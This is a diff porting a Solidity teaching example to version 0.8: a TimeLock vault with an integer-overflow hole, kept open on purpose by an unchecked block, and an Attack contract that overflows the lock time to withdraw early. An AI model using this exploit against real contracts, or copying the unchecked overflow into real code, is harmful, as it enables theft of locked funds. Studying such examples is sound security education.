@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.10;
+pragma solidity ^0.8.0;
 
 // This contract is designed to act as a time vault.
 // User can deposit into this contract but cannot withdraw for atleast a week.
@@ -22,16 +22,17 @@ contract TimeLock {
 
     function deposit() external payable {
         balances[msg.sender] += msg.value;
-        lockTime[msg.sender] = now + 1 weeks;
+        lockTime[msg.sender] = block.timestamp + 1 weeks;
     }
 
     function increaseLockTime(uint _secondsToIncrease) public {
-        lockTime[msg.sender] += _secondsToIncrease;
+        // solidity 0.8 throws error on overflow / underflow
+        unchecked { lockTime[msg.sender] += _secondsToIncrease; }
     }
 
     function withdraw() public {
         require(balances[msg.sender] > 0, "Insufficient funds");
-        require(now > lockTime[msg.sender], "Lock time not expired");
+        require(block.timestamp > lockTime[msg.sender], "Lock time not expired");
 
         uint amount = balances[msg.sender];
         balances[msg.sender] = 0;
@@ -44,7 +45,7 @@ contract TimeLock {
 contract Attack {
     TimeLock timeLock;
 
-    constructor(TimeLock _timeLock) public {
+    constructor(TimeLock _timeLock) {
         timeLock = TimeLock(_timeLock);
     }
 
@@ -58,7 +59,7 @@ contract Attack {
         so x = -t
         */
         timeLock.increaseLockTime(
-            uint(-timeLock.lockTime(address(this)))
+            type(uint).max - timeLock.lockTime(address(this))
         );
         timeLock.withdraw();
     }
